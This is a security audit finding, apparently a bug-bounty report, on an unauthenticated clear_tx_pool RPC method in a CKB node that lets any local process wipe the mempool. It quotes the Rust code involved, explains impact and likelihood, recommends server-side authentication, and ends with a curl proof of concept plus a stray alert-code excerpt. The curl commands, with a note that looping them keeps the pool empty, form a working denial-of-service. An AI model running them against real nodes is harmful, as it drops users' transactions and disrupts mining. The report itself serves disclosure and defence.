### Title
Unauthenticated `clear_tx_pool` RPC Allows Any Local Process to Wipe the Entire Mempool — (File: `rpc/src/module/pool.rs`)

### Summary
The `clear_tx_pool` RPC method removes every pending and proposed transaction from the node's mempool in a single call. The implementation contains no authentication check, no caller-identity verification, and no authorization guard of any kind. Any process that can reach the RPC endpoint — by default any process on the same host — can invoke it unconditionally, causing a complete mempool flush with no operator approval required.

### Finding Description
`clear_tx_pool` is implemented at `rpc/src/module/pool.rs:684`:

```rust
fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool
        .clear_pool(snapshot)
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}
``` [1](#0-0) 

The function immediately delegates to `TxPoolController::clear_pool`, which sends a `ClearPool` message to the tx-pool service:

```rust
pub fn clear_pool(&self, new_snapshot: Arc<Snapshot>) -> Result<(), AnyError> {
    send_message!(self, ClearPool, new_snapshot)
}
``` [2](#0-1) 

The service handler unconditionally calls `service.clear_pool(new_snapshot).await`, which acquires a write lock on the pool and calls `tx_pool.clear(...)`, zeroing all entries, edges, links, size counters, and cycle counters: [3](#0-2) [4](#0-3) 

There is no token, session, password, or caller-identity check at any layer of this call chain. The same absence of access control applies to the companion method `clear_tx_verify_queue` at `rpc/src/module/pool.rs:694`. [5](#0-4) 

The RPC server binds to `127.0.0.1:8114` by default. The miner client optionally sends HTTP Basic Auth headers, but this is a client-side feature; there is no server-side enforcement that requires authentication before dispatching any RPC method, including `clear_tx_pool`. [6](#0-5) [7](#0-6) 

### Impact Explanation
A caller who can reach the RPC endpoint can:
1. Drop every pending and proposed transaction from the mempool in one call.
2. Force all affected users to rebroadcast their transactions.
3. Deny miner fee revenue for the duration of the attack (repeated calls keep the pool empty).
4. Disrupt block assembly: `clear_pool` also resets the block assembler via `BlockAssemblerMessage::Reset`, so the next `get_block_template` call returns an empty template. [8](#0-7) 

The impact is a targeted, repeatable mempool DoS that requires no cryptographic material and no protocol-level privilege.

### Likelihood Explanation
By default the RPC listens on `127.0.0.1:8114`. Any process running on the same host — a co-located web server, a compromised dependency, a malicious script, or a container sharing the host network namespace — can issue a plain HTTP POST with no credentials. In practice, many operators expose the RPC on `0.0.0.0` for remote management, making the attack reachable from the network. The call is a single unauthenticated JSON-RPC request with an empty parameter list, trivially scriptable.

### Recommendation
Add a mandatory authentication layer to the RPC server (e.g., a configurable bearer token or HTTP Basic Auth secret that the server enforces on every request). As a targeted mitigation, gate destructive state-mutation methods (`clear_tx_pool`, `clear_tx_verify_queue`, `remove_transaction`) behind a separate, opt-in module that is disabled by default and requires explicit operator configuration, analogous to how the `IntegrationTest` module is gated. The `Alert` module demonstrates the correct pattern: privileged network-wide actions require cryptographic proof of authority (2-of-4 multisig) before any state change occurs. [9](#0-8) 

### Proof of Concept
With a running CKB node (default config):

```bash
# 1. Submit a transaction to populate the pool
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"tx_pool_info","params":[],"id":1}'
# Observe pending > 0

# 2. Any unprivileged local process wipes the entire pool — no credentials needed
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":2}'
# Returns: {"jsonrpc":"2.0","result":null,"id":2}

# 3. Pool is now empty
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"tx_pool_info","params":[],"id":3}'
# Observe pending == 0, all transactions lost
```

Repeating step 2 in a loop keeps the mempool perpetually empty, preventing any transaction from being included in a block.

    fn send_alert(&self, alert: Alert) -> Result<()> {
        let alert: packed::Alert = alert.into();
        let now_ms = ckb_systemtime::unix_time_as_millis();
        let notice_until: u64 = alert.raw().notice_until().into();
        if notice_until < now_ms {
            return Err(RPCError::invalid_params(format!(
                "Expected `params[0].notice_until` in the future (> {now_ms}), got {notice_until}",
            )));
        }

        let result = self.verifier.verify_signatures(&alert);

        match result {
            Ok(()) => {
                // set self node notifier
                self.notifier.lock().add(&alert);

                self.network_controller.broadcast_with_handle(
                    SupportProtocols::Alert.protocol_id(),
                    alert.as_bytes(),
                    &self.handle,
                );
                Ok(())
            }
            Err(e) => Err(RPCError::custom_with_error(
                RPCError::AlertFailedToVerifySignatures,
                e,
            )),
        }
    }
